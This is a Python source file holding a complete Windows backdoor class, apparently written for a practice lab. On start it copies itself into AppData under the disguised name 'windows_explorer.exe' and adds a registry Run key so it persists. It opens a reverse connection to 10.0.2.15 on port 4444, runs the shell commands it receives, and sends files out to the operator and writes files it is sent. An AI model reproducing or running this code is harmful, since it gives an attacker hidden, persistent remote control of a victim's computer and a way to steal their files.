import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\windows_explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Explorer /t REG_SZ /d "{file_location}"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Bajarildi " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
        
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Yuklanish amalga oshdi"
    
    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                try:
                    if command == "exit":
                        self.connection.close()
                        sys.exit()
                    elif command.startswith("cd") and len(command.split(" ", 1)) > 1: 
                        command_result = self.change_directory(command.split(" ", 1)[1])
                    elif command.startswith("download"):
                        command_result = self.read_file(command.split(" ", 1)[1])
                    elif command.startswith("upload"):
                        path, content = command.split(" ", 2)[1], command.split(" ", 2)[2]
                        command_result = self.write_file(path, content)
                    else:
                        command_result = self.execute_command(command)
                except Exception:
                    command_result = "[-] Error command"
                self.reliable_send(command_result)
            except Exception as e:
                self.reliable_send(str(e))

try:
    my_backdoor = Backdoor("10.0.2.15", 4444)
    my_backdoor.run()       
except Exception:
    sys.exit()
